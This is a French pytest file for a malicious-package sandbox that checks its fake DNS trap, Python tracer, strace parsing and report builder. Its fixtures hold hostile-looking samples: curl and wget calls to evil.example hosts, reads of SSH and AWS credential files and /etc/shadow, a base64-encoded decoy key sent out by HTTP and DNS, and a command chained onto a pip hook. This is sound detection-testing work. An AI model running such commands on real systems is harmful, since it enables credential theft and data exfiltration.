"""Sandbox v1 : les briques testables sans Docker (faux DNS, traceur, rapport)."""

import json
import os
import socket
import struct
import subprocess
import sys
from pathlib import Path

from plateforme.sandbox import piege, rapport

TRACE = Path(piege.__file__).parent / "trace"


# --- faux DNS ---------------------------------------------------------------------------------

def _requete_dns(nom: str, qtype: int = 1) -> bytes:
    qname = b"".join(bytes([len(p)]) + p.encode() for p in nom.split(".")) + b"\0"
    return struct.pack(">HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0) + qname + struct.pack(">HH", qtype, 1)


def test_le_faux_dns_lit_le_nom_demande():
    assert piege.nom_demande(_requete_dns("evil.example.com")) == ("evil.example.com", 1)


def test_le_faux_dns_repond_a_tout_avec_l_ip_du_piege():
    reponse = piege.reponse_dns(_requete_dns("evil.example.com"), "172.30.0.2")
    ident, drapeaux, _, nb_reponses = struct.unpack(">HHHH", reponse[:8])
    assert ident == 0x1234 and drapeaux & 0x8000 and nb_reponses == 1
    assert reponse.endswith(socket.inet_aton("172.30.0.2"))


def test_le_faux_dns_ne_donne_pas_d_ipv6():
    reponse = piege.reponse_dns(_requete_dns("evil.example.com", qtype=28), "172.30.0.2")
    assert struct.unpack(">H", reponse[6:8])[0] == 0


def test_un_paquet_dns_illisible_ne_fait_pas_tomber_le_piege():
    assert piege.nom_demande(b"\x00\x01") is None


def test_le_piege_extrait_l_hote_http():
    brut = b"POST /x?k=AKIA HTTP/1.1\r\nHost: evil.example.com\r\n\r\n"
    assert piege.hote_http(brut) == "evil.example.com"
    assert piege.hote_http(b"\x16\x03\x01 tls") is None


# --- traceur (sitecustomize chargé dans le conteneur) -----------------------------------------

def test_le_traceur_note_fichiers_processus_et_reseau(tmp_path):
    journal = tmp_path / "trace.jsonl"
    leurre = tmp_path / ".aws" / "credentials"
    leurre.parent.mkdir()
    leurre.write_text("[default]\n")
    code = (f"open({str(leurre)!r}).read()\n"
            "import subprocess, sys; subprocess.run([sys.executable, '-c', 'pass', 'marqueur-sas'])\n"
            "import socket\n"
            "try: socket.getaddrinfo('evil.example.com', 443)\n"
            "except OSError: pass\n")
    env = {**os.environ, "PYTHONPATH": str(TRACE), "SAS_TRACE": str(journal), "HOME": str(tmp_path)}
    subprocess.run([sys.executable, "-c", code], env=env, check=True, timeout=30)
    evenements = [json.loads(l) for l in journal.read_text().splitlines()]
    sortes = {(e["e"], str(e.get("v"))) for e in evenements}
    assert ("open", str(leurre)) in sortes
    assert any(e["e"] == "processus" and "marqueur-sas" in e["v"] for e in evenements)
    assert ("dns", "evil.example.com:443") in sortes


def test_sans_sas_trace_le_traceur_ne_fait_rien(tmp_path):
    env = {**os.environ, "PYTHONPATH": str(TRACE)}
    env.pop("SAS_TRACE", None)
    r = subprocess.run([sys.executable, "-c", "print('ok')"], env=env, capture_output=True,
                       text=True, timeout=30)
    assert r.stdout.strip() == "ok"


# --- rapport ----------------------------------------------------------------------------------

LEURRES = {"AWS_SECRET_ACCESS_KEY": "sasleurre0aws1234567890"}
HOME = "/tmp/home"


def _construire(trace=(), reseau=(), code=0):
    return rapport.construire(
        trace=[json.dumps(t) for t in trace], reseau=[json.dumps(r) for r in reseau],
        leurres=LEURRES, home=HOME, code_sortie=code, duree_s=3.2, delai_depasse=False)


def test_un_paquet_sage_donne_un_rapport_vide():
    r = _construire(trace=[{"e": "open", "v": "/usr/lib/python3.12/os.py"}])
    assert (r.requetes_dns, r.connexions, r.fichiers_sensibles, r.leurres_lus, r.processus) == \
        ([], [], [], [], [])
    assert r.code_sortie == 0 and r.duree_s == 3.2


def test_le_rapport_rassemble_dns_connexions_fichiers_et_processus():
    r = _construire(
        trace=[{"e": "open", "v": f"{HOME}/.ssh/id_rsa"}, {"e": "open", "v": "/etc/passwd"},
               {"e": "dns", "v": "evil.example.com:443"}, {"e": "connect", "v": "1.2.3.4:4444"},
               {"e": "processus", "v": "curl http://evil.example.com"}],
        reseau=[{"t": "dns", "nom": "evil.example.com"},
                {"t": "tcp", "port": 80, "hote": "evil.example.com", "debut": "GET / HTTP/1.1"}])
    assert r.requetes_dns == ["evil.example.com"]
    assert r.connexions == ["evil.example.com:80", "evil.example.com:443", "1.2.3.4:4444"]  # piège d'abord (C7)
    assert r.fichiers_sensibles == ["~/.ssh/id_rsa", "/etc/passwd"]
    assert r.leurres_lus == ["~/.ssh/id_rsa"]
    assert r.processus == ["curl http://evil.example.com"]


def test_un_leurre_d_environnement_exfiltre_est_vu_sur_le_reseau_meme_encode():
    import base64
    cache = base64.b64encode(LEURRES["AWS_SECRET_ACCESS_KEY"].encode()).decode()
    r = _construire(reseau=[{"t": "tcp", "port": 80, "hote": "x", "debut": f"GET /?d={cache}"}])
    assert r.leurres_lus == ["AWS_SECRET_ACCESS_KEY (exfiltré)"]
    r = _construire(reseau=[{"t": "dns", "nom": LEURRES["AWS_SECRET_ACCESS_KEY"] + ".evil.com"}])
    assert r.leurres_lus == ["AWS_SECRET_ACCESS_KEY (exfiltré)"]


def test_les_lignes_illisibles_sont_ignorees_et_les_listes_bornees():
    trace = ["pas du json", json.dumps({"e": "open"})] + \
        [json.dumps({"e": "dns", "v": f"h{i}.example.com:80"}) for i in range(500)]
    r = rapport.construire(trace=trace, reseau=[], leurres=LEURRES, home=HOME, code_sortie=0,
                           duree_s=1.0, delai_depasse=False)
    assert len(r.connexions) == rapport.MAX_ENTREES


def test_le_dns_interne_n_est_pas_compte():
    r = _construire(trace=[{"e": "dns", "v": "localhost:80"}], reseau=[{"t": "dns", "nom": "localhost"}])
    assert r.requetes_dns == [] and r.connexions == []


def test_les_commandes_de_pip_a_l_installation_ne_sont_pas_des_alertes():
    r = _construire(trace=[{"e": "processus", "v": "uname -rs", "p": "installation"},
                           {"e": "processus", "v": "uname -rs", "p": "import"},
                           {"e": "processus", "v": "curl evil", "p": "installation"}])
    assert r.processus == ["uname -rs", "curl evil"]


def test_les_crochets_de_construction_de_pip_ne_sont_pas_des_alertes():
    crochet = ("/usr/local/bin/python /usr/local/lib/python3.12/site-packages/pip/_vendor/"
               "pyproject_hooks/_in_process/_in_process.py build_wheel /tmp/tmpg1p8io2e")
    r = _construire(trace=[{"e": "processus", "v": crochet, "p": "installation"},
                           {"e": "processus", "v": crochet + " ; curl evil", "p": "installation"},
                           {"e": "processus", "v": crochet, "p": "import"}])
    assert r.processus == [crochet + " ; curl evil", crochet]


# --- v2 : strace (ce que le traceur Python ne voit pas : code natif, ctypes) -------------------

STRACE_IMPORT = [
    '10 execve("/usr/local/bin/python", ["python", "/outils/importer.py", "demo"], 0x7ff /* 8 vars */) = 0',
    '10 openat(AT_FDCWD, "/tmp/home/.aws/credentials", O_RDONLY|O_CLOEXEC) = 3',
    '10 openat(AT_FDCWD, "/tmp/home/.kube/config", O_RDONLY) = -1 ENOENT (No such file or directory)',
    '10 openat(AT_FDCWD, "/etc/shadow", O_RDONLY) = -1 EACCES (Permission denied)',
    '11 execve("/usr/bin/curl", ["curl", "-s", "http://evil.example/x"], 0x7ff /* 8 vars */) = 0',
    '12 connect(5, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("1.2.3.4")}, 16) = -1 ENETUNREACH',
    '12 connect(6, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("172.30.0.2")}, 16) = 0',
    '12 connect(7, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT',
    'ligne illisible',
]


def test_strace_ajoute_ce_que_le_traceur_python_ne_voit_pas():
    r = rapport.construire(trace=[], reseau=[], leurres=LEURRES, home=HOME, code_sortie=0,
                           duree_s=1.0, delai_depasse=False, ip_piege="172.30.0.2",
                           strace_import=STRACE_IMPORT)
    assert r.fichiers_sensibles == ["~/.aws/credentials"]          # ouvert avec succès seulement
    assert r.leurres_lus == ["~/.aws/credentials"]
    assert r.processus == ["curl -s http://evil.example/x"]         # pas le python de l'analyse
    assert r.connexions == ["1.2.3.4:4444"]                         # pas le piège, pas AF_UNIX


def test_strace_de_l_installation_ignore_les_commandes_de_pip():
    lignes = ['20 execve("/usr/local/bin/python", ["python", "-m", "pip", "install", "x"], 0x7 /* 1 var */) = 0',
              '21 execve("/usr/bin/uname", ["uname", "-rs"], 0x7 /* 1 var */) = 0',
              '22 execve("/usr/bin/wget", ["wget", "http://evil"], 0x7 /* 1 var */) = 0']
    r = rapport.construire(trace=[], reseau=[], leurres=LEURRES, home=HOME, code_sortie=0,
                           duree_s=1.0, delai_depasse=False, strace_installation=lignes)
    assert r.processus == ["wget http://evil"]


def test_strace_et_traceur_ne_doublonnent_pas():
    r = rapport.construire(trace=['{"e": "open", "v": "/tmp/home/.aws/credentials", "p": "import"}'],
                           reseau=[], leurres=LEURRES, home=HOME, code_sortie=0, duree_s=1.0,
                           delai_depasse=False, strace_import=STRACE_IMPORT[1:2])
    assert r.fichiers_sensibles == ["~/.aws/credentials"]


# --- B : C1 (sandbox aveuglée par un journal géant) et C7 -----------------------------------------

def test_c1_le_piege_n_ecrit_pas_les_noms_locaux(tmp_path):
    journal = piege.Journal(str(tmp_path / "reseau.jsonl"))
    for nom in ("localhost", "localhost.", "ip6-localhost", "evil.example.com"):
        piege.noter_dns(journal, nom, 1)
    lignes = (tmp_path / "reseau.jsonl").read_text().splitlines()
    assert [json.loads(l)["nom"] for l in lignes] == ["evil.example.com"]


def test_c1_une_fuite_apres_un_deluge_reste_vue(tmp_path):
    from plateforme import sandbox
    f = tmp_path / "reseau.jsonl"
    with open(f, "w") as o:
        for _ in range(120_000):                       # plus de 5 Mo de bruit
            o.write('{"t": "dns", "nom": "bruit.local.example", "type": 1}\n')
        o.write('{"t": "dns", "nom": "collecte.attaquant.example", "type": 1}\n')
    lignes = sandbox._lire(f)
    r = _construire(reseau=[json.loads(l) for l in lignes])
    assert "collecte.attaquant.example" in r.requetes_dns


def test_c1_un_journal_trop_gros_devient_un_signal(tmp_path, monkeypatch):
    from plateforme import sandbox
    monkeypatch.setattr(sandbox, "MAX_LIGNES", 1000)
    f = tmp_path / "reseau.jsonl"
    f.write_text('{"t": "dns", "nom": "x.example", "type": 1}\n' * 1500)
    lignes = sandbox._lire(f)
    assert lignes[-1] == sandbox.LIGNE_TRONQUEE
    r = rapport.construire(trace=[], reseau=lignes, leurres=LEURRES, home=HOME, code_sortie=0,
                           duree_s=1.0, delai_depasse=False)
    assert rapport.JOURNAL_TRONQUE in r.requetes_dns


def test_c7_un_lien_symbolique_pose_par_le_paquet_n_est_pas_suivi(tmp_path):
    from plateforme import sandbox
    secret = tmp_path / "secret_de_l_hote"
    secret.write_text('{"t": "dns", "nom": "ne-doit-pas-sortir", "type": 1}\n')
    (tmp_path / "trace.jsonl").symlink_to(secret)
    assert sandbox._lire(tmp_path / "trace.jsonl") == []


def test_c7_le_piege_passe_avant_le_traceur():
    trace = [{"e": "connect", "v": f"10.0.0.{i}:80"} for i in range(150)]
    r = _construire(trace=trace, reseau=[{"t": "tcp", "port": 443, "hote": "collecte.attaquant.example",
                                           "debut": ""}])
    assert r.connexions[0] == "collecte.attaquant.example:443"
